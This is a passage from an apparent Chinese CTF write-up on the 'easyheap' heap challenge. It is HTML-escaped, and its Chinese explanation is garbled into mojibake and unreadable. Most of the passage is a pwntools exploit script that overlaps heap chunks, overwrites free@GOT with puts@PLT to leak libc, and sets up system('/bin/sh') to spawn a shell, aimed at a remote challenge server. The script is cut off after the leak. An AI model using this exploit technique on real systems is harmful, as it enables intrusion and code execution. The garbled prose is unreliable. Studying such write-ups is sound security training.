  &lt;li&gt;addä¸€ä¸ª0x20,æ­¤æ—¶ä¾¿æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘&lt;code class=&quot;highlighter-rouge&quot;&gt;*ptr[1]&lt;/code&gt;,å³&lt;code class=&quot;highlighter-rouge&quot;&gt;ptr[0]-&amp;gt;content_ptr&lt;/code&gt;ä¸&lt;code class=&quot;highlighter-rouge&quot;&gt;ptr[1]&lt;/code&gt;,æ­¤æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡&lt;code class=&quot;highlighter-rouge&quot;&gt;edit(0)&lt;/code&gt;æ¥è¦†ç›–&lt;code class=&quot;highlighter-rouge&quot;&gt;ptr[1]-&amp;gt;content_ptr&lt;/code&gt;å®ç°ä»»æ„å†™.ç”±äº&lt;code class=&quot;highlighter-rouge&quot;&gt;ptr[0]&lt;/code&gt;åœ¨é«˜åœ°å€ï¼Œå› æ­¤é¡ºä¾¿å¯ä»¥è¦†ç›–&lt;code class=&quot;highlighter-rouge&quot;&gt;ptr[0]-&amp;gt;content_ptr&lt;/code&gt;ä¸ºputs_gotï¼Œç”¨äºæ³„æ¼libcã€‚&lt;/li&gt;
  &lt;li&gt;é€šè¿‡ä»»æ„å†™å°†free_gotè¦†ç›–æˆputs_pltå®ç°ä»»æ„è¯»ï¼Œé€šè¿‡&lt;code class=&quot;highlighter-rouge&quot;&gt;delete(0)&lt;/code&gt;æ³„éœ²puts_got&lt;/li&gt;
  &lt;li&gt;å†æ¬¡editä¿®æ”¹free_gotä¸ºsystemï¼Œå¹¶å°†&lt;code class=&quot;highlighter-rouge&quot;&gt;*ptr[2]-&amp;gt;content_ptr&lt;/code&gt;å†™ä¸º&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh\x00&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;delete(2)å®ç°getshell&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ä¸‹é¢æ˜¯expï¼Œä¹Ÿç®—æ˜¯æ¯”è¾ƒå·§çš„åˆ©ç”¨äº†ï¼š&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#_*_coding:utf-8_*_
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;local&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log_level&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;debug&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'tmux'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'split'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-h'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./easyheap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./easyheap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/lib/x86_64-linux-gnu/libc.so.6'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;121.36.209.145&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9997&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./easyheap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/lib/x86_64-linux-gnu/libc-2.23.so'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Your choice:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;How long is this message?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;What is the content of the message?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;    
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Your choice:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;What is the index of the item to be deleted?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Your choice:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;What is the index of the item to be modified?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;What is the content of the message?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;free_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;free&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;puts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;puts_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;puts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#0
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#1
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#2
#gdb.attach(p)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#gdb.attach(p)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Your choice:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;How long is this message?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1030&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#0 *struct 
# gdb.attach(p)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#1 
#gdb.attach(p)
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#free_got = 0x602018
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;free_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#gdb.attach(p)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;puts_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#print hex(puts_addr)
